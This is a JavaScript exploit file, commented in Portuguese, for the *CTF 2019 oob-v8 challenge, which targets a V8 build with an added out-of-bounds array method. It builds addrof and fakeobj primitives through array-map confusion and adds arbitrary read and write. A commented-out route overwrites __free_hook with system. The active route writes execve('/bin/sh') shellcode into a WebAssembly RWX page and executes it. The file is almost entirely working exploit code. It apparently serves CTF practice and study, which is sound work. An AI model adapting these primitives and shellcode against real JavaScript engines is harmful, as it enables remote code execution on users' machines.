/**
 * Exploit para o desafio oob-v8 da *CTF 2019
 */
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

/**
 * Converte um número de ponto flutuante em um inteiro grande
 * O valor obtido do V8 costuma ser um número de ponto flutuante; a conversão facilita sua leitura
 * @param {Float} val
 * @returns
 */
function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Consideramos a ordem de bytes little-endian
}

/**
 * Converte um inteiro grande em número de ponto flutuante
 * Antes de escrever no V8, convertemos o inteiro em número de ponto flutuante
 * @param {BigInt} val
 * @returns
 */
function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var temp_obj = {"A":1};
var obj_arr = [temp_obj];
var fl_arr = [1.1, 1.2, 1.3, 1.4];
var map1 = obj_arr.oob();
var map2 = fl_arr.oob();

/**
 * Obtém o endereço de um valor JavaScript arbitrário, exceto Smis
 *
 * @param {Object} in_obj
 * @returns
 */
function addrof(in_obj) {
    // Primeiro, colocamos no índice 0 o objeto cujo endereço queremos descobrir
    obj_arr[0] = in_obj;

    // Substituímos o map do array de objetos pelo map do array de números
    obj_arr.oob(map2);

    // Obtemos o endereço ao acessar o índice 0
    let addr = obj_arr[0];

    // Restauramos o map original
    obj_arr.oob(map1);

    // Retornamos o endereço como BigInt
    return ftoi(addr);
}

/**
 * Cria uma referência falsa ao endereço, como se fosse um objeto
 * Permite ler e escrever no endereço como em um objeto, por exemplo com fake[0].
 * @param {BigInt} addr
 * @returns
 */
function fakeobj(addr) {
    // Primeiro, colocamos o endereço como número de ponto flutuante no índice 0
    fl_arr[0] = itof(addr);

    // Substituímos o map do array de números pelo map do array de objetos
    fl_arr.oob(map1);

    // Obtemos e guardamos o objeto falso naquele endereço
    let fake = fl_arr[0];

    // Restauramos o map original
    fl_arr.oob(map2);

    // Retornamos o objeto
    return fake;
}


// // Para revelar o conteúdo da string a seguir:
// let target_string = "AAAAAAAA";
// let target_string_addr = addrof(target_string);
// console.log("[+] endereço da string de destino: 0x" + target_string_addr.toString(16));
// // %SystemBreak();
// // [+] endereço da string de destino: 0xc6a37f9f3c9
// // (gdb) x/32xw 0xc6a37f9f3c9-1
// // 0xc6a37f9f3c8:	0xd9840461	0x00003369	0xe62bbeea	0x00000008
// // 0xc6a37f9f3d8:	0x41414141	0x41414141	0xd9840461	0x00003369  <-- target_string
// // 0xc6a37f9f3e8:	0xfe1f98a6	0x00000012	0x67726174	0x735f7465

// let floatArray = [1.1, 1.2, 1.3, 1.4];
// let floatArrayMap = floatArray.oob();
// floatArray[0] = floatArrayMap;
// floatArray[2] = itof(BigInt(target_string_addr));
// console.log("[+] endereço revelado de floatArray: 0x" + addrof(floatArray).toString(16));
// // %SystemBreak();

// // [+] endereço revelado de floatArray: 0x3dbbd148f619
// // (gdb) x/32xw 0x3dbbd148f619-1-0x30
// // 0x3dbbd148f5e8:	0xd98414f9	0x00003369	0x00000000	0x00000004  <-- FixedDoubleArray
// // 0x3dbbd148f5f8:	0x43142ed9	0x00003fb1	0x33333333	0x3ff33333
// // 0x3dbbd148f608:	0x37f9f3c9	0x00000c6a	0x66666666	0x3ff66666  <-- elements[2]
// // 0x3dbbd148f618:	0x43142ed9	0x00003fb1	0xd9840c71	0x00003369  <-- JSArray
// // 0x3dbbd148f628:	0xd148f5e9	0x00003dbb	0x00000000	0x00000004  <-- ponteiro elements
// // 0x3dbbd148f638:	0xd9840561	0x00003369	0x43142ed9	0x00003fb1
// // 0x3dbbd148f648:	0xd98412c9	0x00003369	0x00000000	0x00000001
// // 0x3dbbd148f658:	0x00000000	0x00000400	0xd98413b9	0x00003369

// let fakeArray = fakeobj(addrof(floatArray)-0x20n);
// console.log("[+] valor revelado: 0x" + ftoi(fakeArray[0]).toString(16)); // Lemos o valor em target_string_addr + 0x10

// console.log("[+] tentativa de escrita deste valor: " + itof(BigInt(0x4242424242424242)));
// fakeArray[0] = itof(BigInt(0x4242424242424242));
// console.log("[+] valor revelado de fakeArray[0]: " + fakeArray[0]);
// console.log("[+] conteúdo revelado de target_string: " + target_string)


// Usamos este array para ler e escrever em endereços arbitrários
var arb_rw_arr = [map2, 1.2, 1.3, 1.4];

console.log("[+] array de números controlado: 0x" + addrof(arb_rw_arr).toString(16));

function arb_read(addr) {
    // A leitura exige ponteiros com tag; por isso, ajustamos o endereço
    if (addr % 2n == 0)
	addr += 1n;

    // Criamos um objeto falso sobre o array preparado, com o map de um array de números
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Alteramos o ponteiro elements para apontar a read_addr - 0x10
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    // O índice 0 retorna o valor em read_addr
    return ftoi(fake[0]);
}

function initial_arb_write(addr, val) {
    // Criamos um objeto falso sobre o array preparado, com o map de um array de números
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Alteramos o ponteiro elements para apontar a write_addr - 0x10
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    // Escrevemos no índice 0 como número de ponto flutuante
    fake[0] = itof(BigInt(val));
}


function arb_write(addr, val) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    initial_arb_write(backing_store_addr, addr);
    dataview.setBigUint64(0, BigInt(val), true);
}

/**
 * Exploit 1
 */
// // buf_addr = 0x10163430ddd0
// // v8_heap_base_addr = buf_addr & 0xffffffff0000n
// let buf_addr = addrof(buf);
// let v8_heap_base_addr = buf_addr & 0xffffffff0000n
// let heap_ptr_addr = v8_heap_base_addr + 0x10n;

// let heap_ptr = arb_read(heap_ptr_addr);
// let heap_base_addr = heap_ptr - 0x786D0n;
// console.log("[+] ponteiro revelado para a heap: 0x" + heap_ptr.toString(16));
// console.log("[+] endereço base da heap: 0x" + heap_base_addr.toString(16));

// let text_seg_ptr= arb_read(heap_base_addr + 0x2668n);
// let pie_base_addr = text_seg_ptr - 0xBE9B5n;
// console.log("[+] ponteiro revelado para PIE: 0x" + pie_base_addr.toString(16));

// let puts_got_addr = pie_base_addr + 0xD9A3B8n;
// let puts_addr = arb_read(puts_got_addr);
// let libc_base_addr = puts_addr - 0x80970n;
// console.log("[+] ponteiro revelado para a libc: 0x" + libc_base_addr.toString(16));

// let free_hook_addr = libc_base_addr + 0x3ed8e8n;
// let system_addr = libc_base_addr + 0x4f420n;
// arb_write(free_hook_addr, system_addr);
// // %SystemBreak();

// console.log("/bin/sh");

/**
 * Exploit 2
 */

// https://wasdk.github.io/WasmFiddle/
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var rwx_page_addr = arb_read(addrof(wasm_instance)-1n+0x88n);

console.log("[+] endereço da página RWX do Wasm: 0x" + rwx_page_addr.toString(16));

function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    initial_arb_write(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
	    dataview.setUint32(4*i, shellcode[i], true);
    }
}

// referência: https://www.anquanke.com/post/id/267518?hmsr=joyk.com&utm_source=joyk.com&utm_medium=referral#h3-14
var shellcode = [
  0x99583b6a, 0x2fbb4852,
  0x6e69622f, 0x5368732f,
  0x57525f54, 0x050f5e54
];

copy_shellcode(rwx_page_addr, shellcode);

// %SystemBreak();
f();
